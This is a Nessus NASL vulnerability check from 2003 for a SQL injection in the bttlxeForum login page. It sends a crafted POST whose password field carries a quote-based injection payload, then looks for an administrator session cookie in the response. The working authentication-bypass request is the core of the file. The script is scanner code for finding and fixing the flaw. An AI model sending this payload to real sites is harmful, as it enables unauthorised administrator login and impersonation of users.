#
# This script is (C) Renaud Deraison
#
# Ref:
#  Date: Wed, 23 Apr 2003 22:05:30 -0400
#  From: SecurityTracker <help@securitytracker.com>
#  To: bugtraq@securityfocus.com
#  Subject: SQL injection in BttlxeForum

if(description)
{
 script_id(11548);
 script_version("$Revision: 1.3 $");
 script_cve_id("CAN-2003-0215");

 script_name(english:"bttlxeForum SQL injection");
 desc["english"] = "
The remote host is running bttlexeForum, a set of CGIs designed to
run a forum-based web server on a Windows platform.

There is a SQL injection bug in the remote server which allowed
Nessus to log in as 'administrator' by supplying the password 'or id='

An attacker may use this flaw to impersonate users on this host (potentially
making the webmaster legally liable for the impersonations) or gain the control
of the remote SQL database

Solution : http://www.battleaxesoftware.com/forums/forum.asp?forumid=36&select=1812
Risk Factor : High";
 
 script_description(english:desc["english"]);
 script_summary(english:"Uses a SQL query as a password");
 script_category(ACT_ATTACK);
 script_family(english:"CGI abuses");
 script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison");
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = get_kb_item("Services/www");
if(!port) port = 80;
if(!get_port_state(port))exit(0);

dirs = make_list(cgi_dirs(), "/forum", "/bttlxe", "");

foreach d (dirs)
{
 req = http_post(item:d + "/myaccount/login.asp", port:port);
 idx = stridx(req, string("\r\n\r\n"));

 req = string("POST ", d, "/myaccount/login.asp HTTP/1.1\r\n",
"Host: ", get_host_name(), "\r\n",
"User-Agent: Mozilla/7 [en] (X11; U; Linux 2.6.1 ia64)\r\n",
"Accept: */*\r\n",
"Referer: http://", get_host_name(), d, "/myaccount/login.asp\r\n",
"Content-Type: application/x-www-form-urlencoded\r\n",
"Content-Length: 87\r\n\r\n",
"userid=administrator&password=+%27or%27%27%3D%27+&cookielogin=cookielogin&Submit=Log+InN");


 res = http_keepalive_send_recv(port:port, data:req);
 if( res == NULL ) exit(0);

 if("Set-Cookie: ForumMemberLevel=Administrator" >< res)
 {
   security_hole(port);
   exit(0);
 }
}
